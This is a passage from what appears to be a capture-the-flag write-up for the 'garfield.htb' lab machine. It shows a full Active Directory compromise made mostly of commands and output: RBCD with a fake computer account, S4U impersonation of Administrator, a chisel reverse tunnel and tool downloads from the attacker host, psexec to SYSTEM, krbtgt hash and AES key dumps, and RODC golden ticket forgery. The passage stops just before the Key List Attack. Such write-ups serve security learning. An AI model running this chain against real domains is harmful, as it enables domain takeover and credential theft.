+<p>The other key finding here is that l.wilson_adm has <strong>write access on the “RODC Administrators” group</strong>. This is the pivot. That group isn’t local admin on the RODC — what it grants is the delegated right to modify the RODC computer object in AD, including its <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute. In other words, membership in that group lets us set up RBCD against RODC01.</p>
+<h2 id="RBCD-Against-RODC01"><a href="#RBCD-Against-RODC01" class="headerlink" title="RBCD Against RODC01"></a>RBCD Against RODC01</h2><p>The path to the RODC is Resource-Based Constrained Delegation. The plan:</p>
+<ol>
+<li>Add l.wilson_adm to the RODC Administrators group so we can write the RODC’s delegation attribute.</li>
+<li>Create a fake computer account (we have <code>SeMachineAccountPrivilege</code>).</li>
+<li>Configure RBCD so our fake computer is trusted to delegate to RODC01.</li>
+<li>Use S4U2self&#x2F;S4U2proxy to request a service ticket to RODC01 impersonating Administrator.</li>
+</ol>
+<p>First, add ourselves to the group:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ bloodyAD --host garfield.htb -u l.wilson_adm -p <span class="string">&#x27;Hacked123!&#x27;</span> -d garfield.htb \</span><br><span class="line">    add groupMember <span class="string">&quot;RODC Administrators&quot;</span> l.wilson_adm</span><br><span class="line"></span><br><span class="line">[+] l.wilson_adm added to RODC Administrators</span><br></pre></td></tr></table></figure></div>
+
+<p>Create the fake machine account:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ impacket-addcomputer garfield.htb/l.wilson_adm:<span class="string">&#x27;Hacked123!&#x27;</span> \</span><br><span class="line">    -computer-name <span class="string">&#x27;FAKE$&#x27;</span> -computer-pass <span class="string">&#x27;FakePass123!&#x27;</span> -dc-ip 10.129.26.128</span><br><span class="line"></span><br><span class="line">[*] Successfully added machine account FAKE$ with password FakePass123!.</span><br></pre></td></tr></table></figure></div>
+
+<p>Now set RBCD on RODC01 pointing at FAKE$. Easiest to just do it from the WinRM session with PowerShell:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ nxc winrm 10.129.26.128 -u <span class="string">&#x27;l.wilson_adm&#x27;</span> -p <span class="string">&#x27;Hacked123!&#x27;</span> -X \</span><br><span class="line">    <span class="string">&#x27;Set-ADComputer RODC01 -PrincipalsAllowedToDelegateToAccount FAKE$;</span></span><br><span class="line"><span class="string">     Get-ADComputer RODC01 -Properties PrincipalsAllowedToDelegateToAccount |</span></span><br><span class="line"><span class="string">       Select -ExpandProperty PrincipalsAllowedToDelegateToAccount&#x27;</span></span><br><span class="line"></span><br><span class="line">WINRM  10.129.26.128  5985  DC01  CN=FAKE,CN=Computers,DC=garfield,DC=htb</span><br></pre></td></tr></table></figure></div>
+
+<p>RBCD is set. FAKE$ can now impersonate any user to RODC01 via S4U.</p>
+<h2 id="Getting-the-S4U-Ticket-and-the-clock-skew-problem"><a href="#Getting-the-S4U-Ticket-and-the-clock-skew-problem" class="headerlink" title="Getting the S4U Ticket (and the clock skew problem)"></a>Getting the S4U Ticket (and the clock skew problem)</h2><p>Remember that +8h clock skew I mentioned during recon? This is where it bites. Kerberos preauth will flat-out refuse if our clock is too far off from the DC’s, and normally you’d just <code>ntpdate</code> to sync up — except I don’t have root on my Kali box in this context, so I can’t touch the system clock.</p>
+<p>The clean trick is <code>libfaketime</code>: it’s a small <code>LD_PRELOAD</code> shared library that lets you fake the clock <em>per-process</em>, without root and without affecting anything else on the system. Let me grab it out of the Kali package without installing it system-wide:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ apt download libfaketime</span><br><span class="line">$ dpkg-deb -x libfaketime_0.9.12-0.2_amd64.deb /tmp/ftroot</span><br><span class="line">$ find /tmp/ftroot -name <span class="string">&#x27;libfaketime*&#x27;</span></span><br><span class="line">/tmp/ftroot/usr/lib/x86_64-linux-gnu/faketime/libfaketime.so.1</span><br><span class="line"></span><br><span class="line">$ LD_PRELOAD=/tmp/ftroot/usr/lib/x86_64-linux-gnu/faketime/libfaketime.so.1 FAKETIME=<span class="string">&#x27;+8h&#x27;</span> <span class="built_in">date</span></span><br><span class="line">Sat Apr 11 03:45:43 PM EDT 2026   <span class="comment"># +8h applied vs the real time</span></span><br></pre></td></tr></table></figure></div>
+
+<p>Now I can wrap any Kerberos tool with that preload and <code>FAKETIME=&#39;+8h&#39;</code> and preauth is happy. Let me request the S4U ticket for <code>cifs/RODC01</code> impersonating Administrator:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ LD_PRELOAD=/tmp/ftroot/usr/lib/x86_64-linux-gnu/faketime/libfaketime.so.1 FAKETIME=<span class="string">&#x27;+8h&#x27;</span> \</span><br><span class="line">    impacket-getST garfield.htb/<span class="string">&#x27;FAKE$&#x27;</span>:<span class="string">&#x27;FakePass123!&#x27;</span> \</span><br><span class="line">      -spn cifs/RODC01.garfield.htb \</span><br><span class="line">      -impersonate Administrator \</span><br><span class="line">      -dc-ip 10.129.26.128</span><br><span class="line"></span><br><span class="line">[*] Getting TGT <span class="keyword">for</span> user</span><br><span class="line">[*] Impersonating Administrator</span><br><span class="line">[*] Requesting S4U2self</span><br><span class="line">[*] Requesting S4U2Proxy</span><br><span class="line">[*] Saving ticket <span class="keyword">in</span> Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache</span><br></pre></td></tr></table></figure></div>
+
+<p>We now have a <code>cifs/RODC01</code> ticket as Administrator sitting in a ccache. But RODC01 is at <code>192.168.100.2</code>, which we can’t reach. Time to build that tunnel.</p>
+<h2 id="Tunneling-to-the-Internal-Subnet"><a href="#Tunneling-to-the-Internal-Subnet" class="headerlink" title="Tunneling to the Internal Subnet"></a>Tunneling to the Internal Subnet</h2><p>I’ll use chisel for the pivot. First stand up a quick HTTP server on Kali to deliver tooling to DC01, and grab both the linux and windows chisel binaries:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /tmp &amp;&amp; python3 -m http.server 8088 &amp;</span><br><span class="line"></span><br><span class="line">$ curl -sL -o /tmp/chisel.gz https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz</span><br><span class="line">$ gunzip -f /tmp/chisel.gz &amp;&amp; <span class="built_in">chmod</span> +x /tmp/chisel</span><br><span class="line">$ curl -sL -o /tmp/chisel.exe.gz https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_windows_amd64.gz</span><br><span class="line">$ gunzip -f /tmp/chisel.exe.gz</span><br></pre></td></tr></table></figure></div>
+
+<p>l.wilson_adm isn’t local admin on DC01, so I can’t just SMB-write chisel.exe into an admin path — but the WinRM session can write to its own profile folder, so I’ll pull it down with <code>Invoke-WebRequest</code> from inside the session:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ nxc winrm 10.129.26.128 -u <span class="string">&#x27;l.wilson_adm&#x27;</span> -p <span class="string">&#x27;Hacked123!&#x27;</span> -X \</span><br><span class="line">    <span class="string">&#x27;iwr http://10.10.16.91:8088/chisel.exe -OutFile C:\Users\l.wilson_adm\Desktop\chisel.exe;</span></span><br><span class="line"><span class="string">     Get-Item C:\Users\l.wilson_adm\Desktop\chisel.exe | Select Length&#x27;</span></span><br><span class="line"></span><br><span class="line">WINRM  10.129.26.128  5985  DC01  9760768</span><br></pre></td></tr></table></figure></div>
+
+<p>Start the chisel server on Kali:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ /tmp/chisel server --reverse -p 8000 -v &gt; /tmp/chisel_srv.log 2&gt;&amp;1 &amp;</span><br><span class="line">2026/04/11 server: Listening on http://0.0.0.0:8000</span><br></pre></td></tr></table></figure></div>
+
+<p>Now here’s a gotcha I hit. If you launch the chisel client with <code>Start-Process</code> from the WinRM session, it dies the moment the WinRM session closes — the client is a tracked child of the WinRM process and gets torn down within a few seconds. The fix is to properly detach it by launching through <code>cmd /c start &quot;&quot; /B</code> out of a <code>.bat</code>, so the new process is orphaned off and survives the session closing:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> &gt; /tmp/launch.bat &lt;&lt; <span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">start <span class="string">&quot;&quot;</span> /B C:\Users\l.wilson_adm\Desktop\chisel.exe client 10.10.16.91:8000 R:5985:192.168.100.2:5985 R:1445:192.168.100.2:445</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">$ nxc winrm 10.129.26.128 -u <span class="string">&#x27;l.wilson_adm&#x27;</span> -p <span class="string">&#x27;Hacked123!&#x27;</span> -X \</span><br><span class="line">    <span class="string">&#x27;iwr http://10.10.16.91:8088/launch.bat -OutFile C:\Users\l.wilson_adm\Desktop\launch.bat;</span></span><br><span class="line"><span class="string">     cmd /c &quot;C:\Users\l.wilson_adm\Desktop\launch.bat&quot;&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>Notice the port mapping: <code>R:1445:192.168.100.2:445</code>. I’m forwarding the RODC’s SMB (445) to local port <strong>1445</strong>, not 445, because 445 is a privileged port that an unprivileged user can’t bind on Kali. We’ll deal with that gap in a second. Verify the tunnel is up:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ lsof -i -P 2&gt;/dev/null | grep -E <span class="string">&#x27;:5985|:1445&#x27;</span></span><br><span class="line">chisel  88777 kali  7u  IPv6 246891  TCP *:5985 (LISTEN)</span><br><span class="line">chisel  88777 kali  8u  IPv6 246892  TCP *:1445 (LISTEN)</span><br></pre></td></tr></table></figure></div>
+
+<p>Tunnel’s live.</p>
+<h2 id="SYSTEM-on-RODC01"><a href="#SYSTEM-on-RODC01" class="headerlink" title="SYSTEM on RODC01"></a>SYSTEM on RODC01</h2><p>Now I want to psexec into RODC01 using that Administrator ccache. Two problems in the way.</p>
+<p><strong>Problem one:</strong> impacket’s psexec only accepts <code>-port 139</code> or <code>-port 445</code>, it won’t take 1445:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.py: error: argument -port: invalid choice: <span class="string">&#x27;1445&#x27;</span> (choose from 139, 445)</span><br></pre></td></tr></table></figure></div>
+
+<p>I could patch the script, but then I’d have to patch every other impacket tool too. Cleaner to just get something listening on a real 445 locally.</p>
+<p><strong>Problem two:</strong> binding 445 needs <code>CAP_NET_BIND_SERVICE</code>, and I can’t <code>setcap</code> without root:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">setcap</span> cap_net_bind_service=+ep /tmp/chisel</span><br><span class="line">unable to <span class="built_in">set</span> CAP_SETFCAP effective capability: Operation not permitted</span><br></pre></td></tr></table></figure></div>
+
+<p>The way around both is an unprivileged <strong>user namespace</strong>. <code>unshare -U -r</code> drops me into a namespace where I appear as UID 0, and binding “privileged” ports just works:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ unshare -U -r <span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root),65534(nogroup)</span><br><span class="line"></span><br><span class="line">$ unshare -U -r python3 -c <span class="string">&quot;import socket; s=socket.socket(); s.bind((&#x27;0.0.0.0&#x27;,445)); print(&#x27;BOUND&#x27;)&quot;</span></span><br><span class="line">BOUND</span><br></pre></td></tr></table></figure></div>
+
+<p>The important detail is that I’m <strong>not</strong> passing <code>-n</code>, so the network namespace is still shared with the host. That means a listener I bind inside the namespace is visible to everything else. So the trick is: inside the namespace, run a <code>socat</code> that forwards <code>127.0.0.1:445 -&gt; 127.0.0.1:1445</code> (our chisel tunnel), then run impacket against <code>127.0.0.1:445</code>. I wrapped the whole thing in a script:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> &gt; /tmp/run_psexec.sh &lt;&lt; <span class="string">&#x27;EOF&#x27;</span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">socat TCP-LISTEN:445,<span class="built_in">bind</span>=127.0.0.1,reuseaddr,fork TCP:127.0.0.1:1445 &amp;</span><br><span class="line">SPID=$!</span><br><span class="line"><span class="built_in">sleep</span> 1</span><br><span class="line">KRB5CCNAME=/home/kali/Desktop/Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache \</span><br><span class="line">LD_PRELOAD=/tmp/ftroot/usr/lib/x86_64-linux-gnu/faketime/libfaketime.so.1 FAKETIME=<span class="string">&#x27;+8h&#x27;</span> \</span><br><span class="line">  impacket-psexec -k -no-pass -dc-ip 10.129.26.128 -target-ip 127.0.0.1 \</span><br><span class="line">    RODC01.garfield.htb <span class="string">&#x27;whoami&#x27;</span></span><br><span class="line"><span class="built_in">kill</span> <span class="variable">$SPID</span> 2&gt;/dev/null</span><br><span class="line">EOF</span><br><span class="line"><span class="built_in">chmod</span> +x /tmp/run_psexec.sh</span><br><span class="line"></span><br><span class="line">$ unshare -U -r /tmp/run_psexec.sh</span><br><span class="line"></span><br><span class="line">[*] Found writable share ADMIN$</span><br><span class="line">[*] Uploading file NnOVxLvj.exe</span><br><span class="line">[*] Creating service DizB on 127.0.0.1.....</span><br><span class="line">[*] Starting service DizB.....</span><br><span class="line">nt authority\system</span><br><span class="line">[*] Process <span class="built_in">whoami</span> finished with ErrorCode: 0, ReturnCode: 0</span><br></pre></td></tr></table></figure></div>
+
+<p><code>nt authority\system</code> on RODC01. Three stacked tricks to get here — libfaketime for the clock, chisel for the pivot, and the user namespace + socat to bind 445 — but it lands.</p>
+<h2 id="Dumping-the-krbtgt-8245-AES256-Key"><a href="#Dumping-the-krbtgt-8245-AES256-Key" class="headerlink" title="Dumping the krbtgt_8245 AES256 Key"></a>Dumping the krbtgt_8245 AES256 Key</h2><p>The whole reason we went after the RODC is its <code>krbtgt_8245</code> account. That’s the per-RODC krbtgt key that signs the TGTs the RODC issues. If we get its key, we can forge an RODC golden ticket, and then use the Key List Attack against the real DC to pull out the Administrator hash.</p>
+<p>Let me try secretsdump first to dump the RODC’s NTDS over VSS:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> &gt; /tmp/run_secdump.sh &lt;&lt; <span class="string">&#x27;EOF&#x27;</span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">socat TCP-LISTEN:445,<span class="built_in">bind</span>=127.0.0.1,reuseaddr,fork TCP:127.0.0.1:1445 &amp;</span><br><span class="line">SPID=$!</span><br><span class="line"><span class="built_in">sleep</span> 1</span><br><span class="line">KRB5CCNAME=/home/kali/Desktop/Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache \</span><br><span class="line">LD_PRELOAD=/tmp/ftroot/usr/lib/x86_64-linux-gnu/faketime/libfaketime.so.1 FAKETIME=<span class="string">&#x27;+8h&#x27;</span> \</span><br><span class="line">  impacket-secretsdump -k -no-pass -dc-ip 10.129.26.128 -target-ip 127.0.0.1 \</span><br><span class="line">    -use-vss -just-dc RODC01.garfield.htb</span><br><span class="line"><span class="built_in">kill</span> <span class="variable">$SPID</span> 2&gt;/dev/null</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">$ unshare -U -r /tmp/run_secdump.sh</span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt_8245:1603:aad3b435b51404eeaad3b435b51404ee:445aa4221e751da37a10241d962780e2:::</span><br><span class="line">garfield.htb\j.arbuckle:3101:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">garfield.htb\l.wilson_adm:3107:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure></div>
+
+<p>Notice that nearly every account comes back as <code>31d6...</code> — that’s the empty-password NT hash, i.e. a placeholder. That’s expected: an RODC only stores secrets for accounts whose passwords have actually been replicated to it (its Password Replication Policy), which initially is just <code>RODC01$</code> and <code>krbtgt_8245</code>. So <code>445aa4221e751da37a10241d962780e2</code> <em>is</em> the real <code>krbtgt_8245</code> NT hash.</p>
+<p>Problem is, if you try to forge the RODC golden ticket with that RC4&#x2F;NT hash, the modern Server 2019 DC rejects it with <code>KRB_AP_ERR_BAD_INTEGRITY</code> — it validates the PAC signatures using the strongest key available, which is AES256, and an RC4-signed PAC fails. So we need the AES256 key, and <code>secretsdump -just-dc</code> over VSS doesn’t hand us Kerberos keys for this account. Time for mimikatz.</p>
+<p>Upload mimikatz to the RODC through the same SMB tunnel and run <code>lsadump::lsa /inject</code> against <code>krbtgt_8245</code> (I wrapped it in a <code>.bat</code> redirecting to a log, because passing nested quotes through psexec’s <code>cmd /c</code> is painful):</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mimikatz(commandline) <span class="comment"># lsadump::lsa /inject /name:krbtgt_8245</span></span><br><span class="line">Domain : GARFIELD / S-1-5-21-2502726253-3859040611-225969357</span><br><span class="line"></span><br><span class="line">RID  : 00000643 (1603)</span><br><span class="line">User : krbtgt_8245</span><br><span class="line"></span><br><span class="line"> * Primary</span><br><span class="line">    NTLM : 445aa4221e751da37a10241d962780e2</span><br><span class="line"></span><br><span class="line"> * Kerberos-Newer-Keys</span><br><span class="line">    Default Salt : GARFIELD.HTBkrbtgt_8245</span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (4096) : d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240</span><br><span class="line">      aes128_hmac       (4096) : 124c0fd09f5fa4efca8d9f1da91369e5</span><br></pre></td></tr></table></figure></div>
+
+<p>There’s our AES256 key: <code>d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240</code>.</p>
+<h2 id="Modifying-the-RODC-Password-Replication-Policy"><a href="#Modifying-the-RODC-Password-Replication-Policy" class="headerlink" title="Modifying the RODC Password Replication Policy"></a>Modifying the RODC Password Replication Policy</h2><p>One more prerequisite before the golden ticket. For the Key List Attack to actually return Administrator’s key material (instead of just a session key), Administrator has to be <em>allowed to replicate</em> to the RODC. That’s controlled by two attributes on the RODC object:</p>
+<ul>
+<li><code>msDS-RevealOnDemandGroup</code> — the allow list.</li>
+<li><code>msDS-NeverRevealGroup</code> — the deny list, and deny always beats allow.</li>
+</ul>
+<p>Let me look at the current policy:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ bloodyAD --host 10.129.26.128 -u <span class="string">&#x27;l.wilson_adm&#x27;</span> -p <span class="string">&#x27;Hacked123!&#x27;</span> -d garfield.htb \</span><br><span class="line">    get object <span class="string">&#x27;CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb&#x27;</span> \</span><br><span class="line">    --attr msDS-RevealOnDemandGroup,msDS-NeverRevealGroup</span><br><span class="line"></span><br><span class="line">msDS-NeverRevealGroup: ...; CN=Administrators,CN=Builtin,DC=garfield,DC=htb</span><br><span class="line">msDS-RevealOnDemandGroup: CN=Allowed RODC Password Replication Group,CN=Users,DC=garfield,DC=htb</span><br></pre></td></tr></table></figure></div>
+
+<p>Administrator is a member of <code>BUILTIN\Administrators</code>, which sits in the NeverReveal (deny) group — so even if we allow Administrator, that explicit deny wins. We need to both add Administrator to the allow group <strong>and</strong> wipe the deny group. Since l.wilson_adm has write on the RODC object via the RODC Administrators group, we can do both:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ bloodyAD --host 10.129.26.128 -u <span class="string">&#x27;l.wilson_adm&#x27;</span> -p <span class="string">&#x27;Hacked123!&#x27;</span> -d garfield.htb \</span><br><span class="line">    <span class="built_in">set</span> object <span class="string">&#x27;CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb&#x27;</span> \</span><br><span class="line">    msDS-RevealOnDemandGroup \</span><br><span class="line">      -v <span class="string">&#x27;CN=Administrator,CN=Users,DC=garfield,DC=htb&#x27;</span> \</span><br><span class="line">      -v <span class="string">&#x27;CN=Allowed RODC Password Replication Group,CN=Users,DC=garfield,DC=htb&#x27;</span></span><br><span class="line"></span><br><span class="line">[+] msDS-RevealOnDemandGroup has been updated</span><br><span class="line"></span><br><span class="line">$ bloodyAD --host 10.129.26.128 -u <span class="string">&#x27;l.wilson_adm&#x27;</span> -p <span class="string">&#x27;Hacked123!&#x27;</span> -d garfield.htb \</span><br><span class="line">    <span class="built_in">set</span> object <span class="string">&#x27;CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb&#x27;</span> msDS-NeverRevealGroup</span><br><span class="line"></span><br><span class="line">[+] msDS-NeverRevealGroup has been updated</span><br></pre></td></tr></table></figure></div>
+
+<p>Setting <code>msDS-NeverRevealGroup</code> with no values clears it entirely. Administrator is now allowed to be replicated to the RODC.</p>
+<h2 id="RODC-Golden-Ticket-Key-List-Attack"><a href="#RODC-Golden-Ticket-Key-List-Attack" class="headerlink" title="RODC Golden Ticket + Key List Attack"></a>RODC Golden Ticket + Key List Attack</h2><p>Now the payoff. I’ll forge an RODC golden ticket as Administrator using the <code>krbtgt_8245</code> AES256 key, then send it to DC01 with the Key List Attack to extract the real Administrator hash.</p>
+<p>One heads up: use a recent Rubeus. Rubeus 2.2 builds the PAC for RODC golden tickets in a way the modern DC rejects with <code>BAD_INTEGRITY</code> even when the key is correct — 2.3.3 from SharpCollection signs it properly. Grab that one.</p>
+<p>Forge the ticket:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> &gt; /tmp/golden2.bat &lt;&lt; <span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">cd</span> C:\Users\l.wilson_adm\Desktop</span><br><span class="line">.\Rubeus.exe golden ^</span><br><span class="line">    /aes256:d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240 ^</span><br><span class="line">    /user:Administrator /id:500 ^</span><br><span class="line">    /domain:garfield.htb ^</span><br><span class="line">    /sid:S-1-5-21-2502726253-3859040611-225969357 ^</span><br><span class="line">    /rodcNumber:8245 ^</span><br><span class="line">    /flags:forwardable,renewable,enc_pa_rep ^</span><br><span class="line">    /nowrap &gt; golden2.log 2&gt;&amp;1</span><br><span class="line"><span class="built_in">type</span> golden2.log</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[*] Action: Build TGT</span><br><span class="line">[*] Building PAC</span><br><span class="line">[*] SID            : S-1-5-21-2502726253-3859040611-225969357</span><br><span class="line">[*] UserId         : 500</span><br><span class="line">[*] ServiceKey     : D6C93CBE006372ADB8403630F9E86594F52C8105A52F9B21FEF62E9C7A75E240</span><br><span class="line">[*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256</span><br><span class="line">[*] Forged a TGT <span class="keyword">for</span> <span class="string">&#x27;Administrator@garfield.htb&#x27;</span></span><br><span class="line">[*] <span class="built_in">base64</span>(ticket.kirbi):</span><br><span class="line">doIFkjCCBY6gAwIBBaEDAgEWooIEfzCCBHthggR3MIIEc6ADAgEFoQ4bDEdBUkZJRUxELkhUQqIhMB+...</span><br></pre></td></tr></table></figure></div>
+
+<p>The key part is <code>/rodcNumber:8245</code> — that encodes the RODC branch ID into the ticket’s kvno field, which tells the full DC to validate the PAC signatures with <code>krbtgt_8245</code>‘s keys rather than the main krbtgt.</p>
+<p>Now the Key List Attack. I feed that forged TGT back to DC01 with <code>/keyList /service:krbtgt/garfield.htb</code>. The DC treats it as a legitimate RODC request, replicates Administrator’s password material (which we just allowed via the PRP), and hands back the NT hash:</p>
